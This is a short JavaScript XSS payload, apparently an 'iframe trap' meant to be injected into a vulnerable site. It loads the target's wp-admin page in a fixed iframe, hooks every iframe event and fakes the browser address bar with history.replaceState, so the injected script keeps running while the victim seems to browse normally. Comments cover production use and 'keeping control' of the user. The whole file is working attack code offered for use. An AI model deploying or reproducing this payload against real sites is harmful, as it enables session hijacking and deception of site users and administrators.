alert('Ready to launch trap?');



// Ue fullscreen for actual prod usage
// not fullscreen shows the XSS laden landing
// page in the background so you can 
// tell if you're still where you need to be during
// development. 
let fullscreenIframe = false; // Set to true for production use, false for dev


// What page in the application to start users in
// Note that if the trap is loading from
// a reload, it hopefully will automatically
// load the page the user was on in the iframe
// when they reloaded the page. Otherwise,
// they'll start here
let startingPage = "https://targetapp.possiblymalware.com/wp-admin";




// Helpful variables
let trapLandingPage = "";
let savedFakePage   = "";





// Snag the path of the iframe, and fake it in the browser
// address bar. It'll look like they're surfing the site
// Note: if the user refreshes the page, the gig is up
// and your XSS will stop executing. But as long as they
// keep clicking around, you keep control and you XSS 
// keeps running
function updateUrl()
{
	var fakeUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
	console.log("Fake url is: " + fakeUrl);
	window.history.replaceState(null, '', fakeUrl);
}







function takeOver()
{

	document.body.style.backgroundColor = "pink";

	// Setup our iframe trap
	var iframe = document.createElement("iframe");
	iframe.setAttribute("src", startingPage);

	if (fullscreenIframe)
	{
		console.log("&& Using fullscreen");
		iframe.style.width  = "100%";
		iframe.style.height = "100%";
		iframe.style.top = "0px";
		iframe.style.left = "0px"
	}
	else
	{
		console.log("&& Using partial screen");
		iframe.style.width  = "80%";
		iframe.style.height = "80%";
		iframe.style.top = "50px";
		iframe.style.left = "50px";
	}
	iframe.style.position = "fixed";
	iframe.id = "iframe_a";
	document.body.appendChild(iframe);


	// Hook needed events below...

	// Just register all the darned events, each event in the iframe
	// we'll call updateUrl()
	var myIframe = document.getElementById('iframe_a');

	// Hook all the things for URL faking
	for(var key in myIframe){
   		if(key.search('on') === 0) {
      		myIframe.addEventListener(key.slice(2), updateUrl);
   		 }
	}

}



// Trap all the things
takeOver();
